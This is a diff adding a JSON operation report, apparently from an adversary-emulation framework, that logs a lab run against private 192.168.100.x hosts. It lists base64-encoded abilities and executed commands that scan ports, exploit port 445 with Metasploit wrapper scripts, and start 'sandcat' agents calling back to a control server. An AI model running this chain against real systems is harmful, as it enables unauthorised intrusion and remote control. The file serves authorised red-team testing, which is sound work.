@@ -1,0 +1,374 @@
+{
+    "name": "metasploit sandcat",
+    "id": 4,
+    "host_group": [
+        {
+            "id": 1,
+            "paw": "kali$root",
+            "last_seen": "2019-11-20 17:25:49",
+            "architecture": "amd64",
+            "platform": "linux",
+            "server": "http://192.168.100.130:8888",
+            "host_group": "my_group",
+            "location": "/tmp/sandcat-linux",
+            "pid": 75567,
+            "ppid": 20085,
+            "trusted": 1,
+            "last_trusted_seen": "2019-11-20 17:25:49",
+            "sleep_min": 10,
+            "sleep_max": 10,
+            "executors": [
+                {
+                    "executor": "sh",
+                    "preferred": 1
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        }
+    ],
+    "start": "2019-11-20 17:23:02",
+    "facts": [
+        {
+            "id": 9,
+            "property": "remote.host.ip",
+            "value": "192.168.100.128",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 13,
+            "property": "remote.host.socket",
+            "value": "192.168.100.128:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 6
+        }
+    ],
+    "finish": "2019-11-20 17:25:50",
+    "planner": {
+        "id": 1,
+        "name": "sequential",
+        "module": "plugins.stockpile.app.sequential",
+        "params": {}
+    },
+    "adversary": {
+        "id": 18,
+        "adversary_id": "8b6fa60d-8faa-4b99-a184-ab7b8d8a432e",
+        "name": "metasploit sandcat",
+        "description": "exploit with metasploit and run sandcat",
+        "phases": {
+            "1": [
+                {
+                    "id": 26,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "cHl0aG9uMyBzY2FubmVyLnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 26,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 26,
+                            "payload": "scanner.py"
+                        }
+                    ],
+                    "adversary_map_id": 81
+                },
+                {
+                    "id": 27,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "cHl0aG9uMyBzY2FubmVyLnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 27,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 27,
+                            "payload": "scanner.py"
+                        }
+                    ],
+                    "adversary_map_id": 81
+                },
+                {
+                    "id": 28,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "cHl0aG9uMyBzY2FubmVyLnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 28,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 28,
+                            "payload": "scanner.py"
+                        }
+                    ],
+                    "adversary_map_id": 81
+                }
+            ],
+            "2": [
+                {
+                    "id": 208,
+                    "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Socket With Metasploit",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X2V4cGxvaXRfcG9ydC5weSAtLXRhcmdldCAje3JlbW90ZS5ob3N0LnNvY2tldH0=",
+                    "description": "Use Metasploit to Broadly Exploit a Remote Port",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 208,
+                            "payload": "metasploit_exploit_port.py"
+                        }
+                    ],
+                    "adversary_map_id": 82
+                },
+                {
+                    "id": 207,
+                    "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Socket With Metasploit",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X2V4cGxvaXRfcG9ydC5weSAtLXRhcmdldCAje3JlbW90ZS5ob3N0LnNvY2tldH0=",
+                    "description": "Use Metasploit to Broadly Exploit a Remote Port",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 207,
+                            "payload": "metasploit_exploit_port.py"
+                        }
+                    ],
+                    "adversary_map_id": 82
+                },
+                {
+                    "id": 210,
+                    "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Socket With Metasploit",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X2V4cGxvaXRfcG9ydC5weSAtLXRhcmdldCAje3JlbW90ZS5ob3N0LnNvY2tldH0=",
+                    "description": "Use Metasploit to Broadly Exploit a Remote Port",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 210,
+                            "payload": "metasploit_exploit_port.py"
+                        }
+                    ],
+                    "adversary_map_id": 82
+                },
+                {
+                    "id": 209,
+                    "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Socket With Metasploit",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X2V4cGxvaXRfcG9ydC5weSAtLXRhcmdldCAje3JlbW90ZS5ob3N0LnNvY2tldH0=",
+                    "description": "Use Metasploit to Broadly Exploit a Remote Port",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 209,
+                            "payload": "metasploit_exploit_port.py"
+                        }
+                    ],
+                    "adversary_map_id": 82
+                }
+            ],
+            "3": [
+                {
+                    "id": 112,
+                    "ability_id": "d189c023-314c-4445-b1c5-6634b827e183",
+                    "tactic": "execution",
+                    "technique_name": "Command-Line Interface",
+                    "technique_id": "T1059",
+                    "name": "Metasploit Start Sandcat",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X3NhbmRjYXRfc3RhcnQucHkgI3tzZXJ2ZXJ9",
+                    "description": "Starts a Sandcat Agent on all Metasploit sessions",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 112,
+                            "payload": "metasploit_sandcat_start.py"
+                        }
+                    ],
+                    "adversary_map_id": 83
+                },
+                {
+                    "id": 111,
+                    "ability_id": "d189c023-314c-4445-b1c5-6634b827e183",
+                    "tactic": "execution",
+                    "technique_name": "Command-Line Interface",
+                    "technique_id": "T1059",
+                    "name": "Metasploit Start Sandcat",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X3NhbmRjYXRfc3RhcnQucHkgI3tzZXJ2ZXJ9",
+                    "description": "Starts a Sandcat Agent on all Metasploit sessions",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 111,
+                            "payload": "metasploit_sandcat_start.py"
+                        }
+                    ],
+                    "adversary_map_id": 83
+                },
+                {
+                    "id": 114,
+                    "ability_id": "d189c023-314c-4445-b1c5-6634b827e183",
+                    "tactic": "execution",
+                    "technique_name": "Command-Line Interface",
+                    "technique_id": "T1059",
+                    "name": "Metasploit Start Sandcat",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X3NhbmRjYXRfc3RhcnQucHkgI3tzZXJ2ZXJ9",
+                    "description": "Starts a Sandcat Agent on all Metasploit sessions",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 114,
+                            "payload": "metasploit_sandcat_start.py"
+                        }
+                    ],
+                    "adversary_map_id": 83
+                },
+                {
+                    "id": 113,
+                    "ability_id": "d189c023-314c-4445-b1c5-6634b827e183",
+                    "tactic": "execution",
+                    "technique_name": "Command-Line Interface",
+                    "technique_id": "T1059",
+                    "name": "Metasploit Start Sandcat",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X3NhbmRjYXRfc3RhcnQucHkgI3tzZXJ2ZXJ9",
+                    "description": "Starts a Sandcat Agent on all Metasploit sessions",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 113,
+                            "payload": "metasploit_sandcat_start.py"
+                        }
+                    ],
+                    "adversary_map_id": 83
+                }
+            ]
+        }
+    },
+    "jitter": "4/8",
+    "steps": [
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "python3 scanner.py -i 192.168.100.128",
+            "delegated": "2019-11-20 17:23:03.464223",
+            "run": "2019-11-20 17:23:03",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+            "paw": "kali$root",
+            "command": "python3 metasploit_exploit_port.py --target 192.168.100.128:445",
+            "delegated": "2019-11-20 17:23:11.473802",
+            "run": "2019-11-20 17:25:45",
+            "status": 1,
+            "description": "Use Metasploit to Broadly Exploit a Remote Port",
+            "name": "Exploit Socket With Metasploit",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "d189c023-314c-4445-b1c5-6634b827e183",
+            "paw": "kali$root",
+            "command": "python3 metasploit_sandcat_start.py http://192.168.100.130:8888",
+            "delegated": "2019-11-20 17:25:49.534568",
+            "run": "2019-11-20 17:25:49",
+            "status": 1,
+            "description": "Starts a Sandcat Agent on all Metasploit sessions",
+            "name": "Metasploit Start Sandcat",
+            "attack": {
+                "tactic": "execution",
+                "technique_name": "Command-Line Interface",
+                "technique_id": "T1059"
+            }
+        }
+    ]
+}
